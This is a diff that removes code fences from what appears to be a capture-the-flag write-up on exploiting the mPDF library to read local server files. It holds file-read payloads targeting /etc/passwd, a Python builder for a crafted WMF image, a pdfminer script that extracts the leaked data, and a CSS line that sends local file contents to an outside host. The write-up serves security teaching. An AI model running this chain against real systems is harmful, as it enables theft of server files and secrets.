@@ -20,11 +20,6 @@ RUN apt update && apt install -y \
 COPY --from=composer/composer /usr/bin/composer /usr/bin/composer
 RUN cd /var/www/ && composer require mpdf/mpdf
 RUN chmod -R 733 /var/www/vendor/mpdf/mpdf/tmp
-```
-
-
-
-```
 <?php
 error_reporting(0);
 require_once __DIR__ . '/../vendor/autoload.php';
@@ -52,23 +47,8 @@ if (isset($_POST['url'])) {
 <!-- snipped - just the HTML webpage stuff -->
 
 <?php /* $FLAG = 'hitcon{redacted}' */ ?>
-```
 
-
-
-```
-<img src="/etc/passwd">
-```
-
-
-
-```
 Fatal error: Uncaught Mpdf\MpdfImageException: Error parsing image file - image type not recognised and/or not supported by GD imagecreate (/etc/passwd)
-```
-
-
-
-```
 public function fetchDataFromPath($path, $originalSrc = null)
 {
  /**
@@ -92,11 +72,6 @@ public function fetchDataFromPath($path, $originalSrc = null)
  ? $this->fetchLocalContent($path, $originalSrc)
  : $this->fetchRemoteContent($path);
 }
-```
-
-
-
-```
 public function fetchLocalContent($path, $originalSrc)
 {
  $data = '';
@@ -104,37 +79,24 @@ public function fetchLocalContent($path, $originalSrc)
  if ($originalSrc && $this->mpdf->basepathIsLocal && $check = @fopen($originalSrc, 'rb')) {
  fclose($check);
  $path = $originalSrc;
- $this->logger->debug(sprintf('Fetching content of file "%s" with local basepath', $path), ['context' => LogContext::REMOTE_CONTENT]);
+ $this->logger->debug(sprintf('Fetching content of file "%s" with local basepath', $path), ['context' => LogContext::
+REMOTE_CONTENT]);
 
  return $this->contentLoader->load($path);
  }
 
  if ($path && $check = @fopen($path, 'rb')) {
  fclose($check);
- $this->logger->debug(sprintf('Fetching content of file "%s" with non-local basepath', $path), ['context' => LogContext::REMOTE_CONTENT]);
+ $this->logger->debug(sprintf('Fetching content of file "%s" with non-local basepath', $path), ['context' => LogContext::
+REMOTE_CONTENT]);
 
  return $this->contentLoader->load($path);
  }
 
  return $data;
 }
-```
 
 
-
-```
-<base href="">
-```
-
-
-
-```
-<img src="/">
-```
-
-
-
-```
 if (trim($path) != '' && !(stristr($e, "src=") !== false && substr($path, 0, 4) == 'var:') && substr($path, 0, 1) != '@') {
  $path = htmlspecialchars_decode($path); // mPDF 5.7.4 URLs
  $orig_srcpath = $path;
@@ -142,23 +104,8 @@ if (trim($path) != '' && !(stristr($e, "src=") !== false && substr($path, 0, 4) 
  $regexp = '/ (href|src)="(.*?)"/i';
  $e = preg_replace($regexp, ' \\1="' . $path . '"', $e);
 }
-```
 
-
-
-```
-<img src="@/">
-```
-
-
-
-```
 <svg><!--</svg>-->
-```
-
-
-
-```
 case 0x0538: // PolyPolygon
  $coords = unpack('s' . ($size - 3), $parms);
  $numpolygons = $coords[1];
@@ -176,11 +123,6 @@ case 0x0538: // PolyPolygon
  }
  $adjustment += $numpoints * 2;
  }
-```
-
-
-
-```
 n_points = 20 # No. x/y point pairs to include
 
 sz = (n_points * 2 + 6).to_bytes(4, byteorder='little')
@@ -196,11 +138,6 @@ pay = b"\xd7\xcd\xc6\x9a" + # Magic Bytes
  b"\x01\x00" + # 1 polygon
  n + # of N points
  b"AA" # Padding to make payload size multiple of 3
-```
-
-
-
-```
 29744 21324 l
 29744 21324 l
 29257 21324 l
@@ -217,11 +154,6 @@ pay = b"\xd7\xcd\xc6\x9a" + # Magic Bytes
 29744 21324 l
 29744 21324 l
 16705 31051 l
-```
-
-
-
-```
 from pdfminer.pdfdocument import PDFDocument, PDFNoOutlines, PDFXRefFallback
 from pdfminer.pdfparser import PDFParser
 from pdfminer.pdftypes import PDFStream, PDFObjRef, resolve1, stream_value
@@ -239,7 +171,7 @@ for xref in doc.xrefs:
  obj = doc.getobj(objid)
  if obj is None:
  continue
- 
+
  # Find a stream which provides "Type", which identifies our vector point data
  if isinstance(obj, PDFStream) and "Type" in obj.attrs:
  # Grab the data ito dstring
@@ -263,36 +195,16 @@ for byte_pair in dat:
 
 # Print the final data, less the first 2 `AA` padding bytes
 print(final_data[2:].decode("ascii"))
-```
-
-
-
-```
 +------------------------ADw-/form+------------------------AD4
 +------------------------ADw-/section+------------------------AD4
 +------------------------ADw-/article+------------------------AD4
 +------------------------ADw-/main+------------------------AD4
 +------------------------ADw-script src+------------------------AD0AIg-https://js.hcaptcha.com/1/api.js+------------------------ACI async defer+------------------------AD4APA-/script+------------------------AD4
 +------------------------ADw-/body+------------------------AD4
-```
-
-
-
-```
 +------------------------ADw?php /+------------------------ACo +------------------------ACQ-FLAG +------------------------AD0 'hitcon+------------------------AHs-Parse+------------------------AF8-Document+------------------------AF8-Failed+------------------------AF8-QAQ+------------------------AF8-aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw+------------------------AH0' +-------------------
-```
-
-
-
-```
 img{
  my-cool-property: '@include url(/local/file.css)'
 }
-```
-
-
-
-```
 div {
  background-image: 'https://exfil.hexf.me/?data=@include url(/local/file.css)'
 }
